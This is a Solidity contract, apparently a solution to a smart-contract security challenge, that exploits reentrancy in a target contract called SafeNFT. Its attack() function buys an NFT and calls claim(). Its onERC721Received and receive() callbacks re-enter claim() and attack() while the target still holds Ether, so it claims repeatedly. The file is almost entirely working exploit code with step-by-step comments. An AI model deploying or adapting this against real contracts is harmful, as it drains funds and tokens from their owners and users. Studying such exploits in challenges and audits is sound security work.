// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
//import "@openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

import "./SafeNFT.sol";

contract Reentrancy is IERC721Receiver {
    SafeNFT public safeNFT;
    address public owner;

    constructor(address _safeNFTAddress) {
        safeNFT = SafeNFT(_safeNFTAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        // Send Ether to buy the NFT
        safeNFT.buyNFT{value: msg.value}();

        // Call claim and attempt reentrancy
        safeNFT.claim();


    }

        function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        if (address(safeNFT).balance > 0) {
            // Try to reenter the claim function
            safeNFT.claim();
        }

        // Return the selector to confirm the transfer
        return this.onERC721Received.selector;
    }

    // Function to receive Ether
    receive() external payable {
        // Reenter the attack if the contract receives Ether
        if (address(safeNFT).balance > 0) {
            attack();
        }
    }
}